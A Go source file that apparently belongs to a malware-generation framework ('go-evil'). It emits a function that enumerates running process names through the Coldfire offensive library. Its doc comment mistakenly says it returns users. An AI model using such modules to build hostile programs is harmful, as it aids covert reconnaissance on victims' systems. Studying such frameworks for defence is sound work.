package processes

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Tries to grab all process names
// Input None
// The return is an evil array containing all found users which is placed in a runtime variable
func Get_names(value string, s_json string) ([]string, string) {
	data_object := structure.Receive(s_json)
	function_call := "get_processes_names"

	data_object.Add_go_function([]string{
		fmt.Sprintf("func %s(){", function_call),
		"processes, err := coldfire.Processes()",
		"if err != nil{",
		"spine.log(err.Error())",
		"}",
		"arr := structure.Create_evil_object(\"\")",
		"for _, value := range processes{",
		"arr.Append(value)",
		"}",
		"spine.variable.set(arr.To_string(\"evil\"))",
		"}"})
	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/structure")

	return []string{fmt.Sprintf("%s()", function_call)}, structure.Send(data_object)
}
